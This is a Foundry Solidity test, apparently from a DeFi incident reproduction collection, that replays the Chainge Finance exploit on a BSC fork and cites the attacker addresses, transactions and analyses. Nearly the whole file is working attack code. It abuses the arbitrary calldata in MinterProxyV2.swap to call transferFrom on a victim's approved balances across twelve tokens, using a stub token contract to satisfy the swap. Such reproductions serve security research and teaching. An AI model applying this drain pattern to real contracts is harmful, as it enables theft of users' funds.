// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~200K
// Attacker1 : https://bscscan.com/address/0x6eec0f4c017afe3dfadf32b51339c37e9fd59dfb
// Attack Contract : https://bscscan.com/address/0x791c6542bc52efe4f20df0ee672b88579ae3fd9a
// Vulnerable Contract : https://bscscan.com/address/0x80a0d7a6fd2a22982ce282933b384568e5c852bf
// Attack Tx1 : https://bscscan.com/tx/0x051276afa96f2a2bd2ac224339793d82f6076f76ffa8d1b9e6febd49a4ec11b2
// Attack Tx2 : https://bscscan.com/tx/0x407e09faabf7072cd10dc86b7fa3180ccc1701f52f7fdca29464568498c30997
// Attack Tx3 : https://bscscan.com/tx/0x21d8b164f0cb8beb1ed27d164ed986c3fc26b33655ce18226b05b9cfcf6cd93c

// Attacker2 : https://bscscan.com/address/0xacdbe7b770a14ca3bc34865ac3986c0ce771fd68
// Attack Contract : https://bscscan.com/address/0x52b19de39476823d33ab4b1edbec91e29dadba38
// Attack Tx : https://bscscan.com/tx/0xd348b5fc00b26fc1457b70d02f9cb5e5a66a564cc4eba2136a473866a47dac08

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x80a0d7a6fd2a22982ce282933b384568e5c852bf#code

// @Analysis
// https://x.com/CertiKAlert/status/1779863821122691519
// https://x.com/ChainAegis/status/1780064080512143429
// https://github.com/Autosaida/DeFiHackAnalysis/blob/master/analysis/240415_ChaingeFinance.md

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(
        address account
    ) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface MinterProxyV2 {
    function swap(
        address tokenAddr,
        uint256 amount,
        address target,
        address receiveToken,
        address receiver,
        uint256 minAmount,
        bytes calldata callData,
        bytes calldata order
    ) external payable;
}

contract ChaingeFinanceTest is Test {
    IBEP20 constant usdt = IBEP20(0x55d398326f99059fF775485246999027B3197955);
    IBEP20 constant sol = IBEP20(0x570A5D26f7765Ecb712C0924E4De545B89fD43dF);
    IBEP20 constant AVAX = IBEP20(0x1CE0c2827e2eF14D5C4f29a091d735A204794041);
    IBEP20 constant babydoge = IBEP20(0xc748673057861a797275CD8A068AbB95A902e8de);
    IBEP20 constant FOLKI = IBEP20(0xfb5B838b6cfEEdC2873aB27866079AC55363D37E);
    IBEP20 constant ATOM = IBEP20(0x0Eb3a705fc54725037CC9e008bDede697f62F335);
    IBEP20 constant TLOS = IBEP20(0xb6C53431608E626AC81a9776ac3e999c5556717c);
    IBEP20 constant IOTX = IBEP20(0x9678E42ceBEb63F23197D726B29b1CB20d0064E5);
    IBEP20 constant linch = IBEP20(0x111111111117dC0aa78b770fA6A738034120C302);
    IBEP20 constant link = IBEP20(0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD);
    IBEP20 constant btcb = IBEP20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IBEP20 constant eth = IBEP20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    address constant victim = 0x8A4AA176007196D48d39C89402d3753c39AE64c1;
    MinterProxyV2 minterproxy = MinterProxyV2(0x80a0D7A6FD2A22982Ce282933b384568E5c852bF);
    uint256 balance;

    uint256 blocknumToForkFrom = 37_880_387;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
    }

    function testExploit() public {
        address[12] memory targetToken = [
            address(usdt),
            address(sol),
            address(AVAX),
            address(babydoge),
            address(FOLKI),
            address(ATOM),
            address(TLOS),
            address(IOTX),
            address(linch),
            address(link),
            address(btcb),
            address(eth)
        ];

        for (uint256 i = 0; i < targetToken.length; i++) {
            _attack(targetToken[i]);
        }
    }

    function _attack(
        address targetToken
    ) private {
        uint256 Balance = IBEP20(targetToken).balanceOf(victim);
        uint256 Allowance = IBEP20(targetToken).allowance(victim, address(minterproxy));
        uint256 amount = Balance < Allowance ? Balance : Allowance;
        if (amount == 0) {
            emit log_named_string("No allowed targetToken", IBEP20(targetToken).name());
            return;
        }
        bytes memory transferFromData =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, address(this), amount);
        minterproxy.swap(
            address(this), 1, targetToken, address(this), address(this), 1, transferFromData, bytes(hex"00")
        );
        emit log_named_string("targetToken", IBEP20(targetToken).name());
        emit log_named_decimal_uint(
            "profit", IBEP20(targetToken).balanceOf(address(this)), IBEP20(targetToken).decimals()
        );
    }

    function balanceOf(
        address /*account*/
    ) external view returns (uint256) {
        return balance;
    }

    function transfer(address, /*recipient*/ uint256 /*amount*/ ) external pure returns (bool) {
        return true;
    }

    function allowance(address, /*_owner*/ address /*spender*/ ) external pure returns (uint256) {
        return type(uint256).max;
    }

    function approve(address, /*spender*/ uint256 /*amount*/ ) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, /*sender*/ address, /*recipient*/ uint256 amount) external returns (bool) {
        balance += amount;
        return true;
    }
}
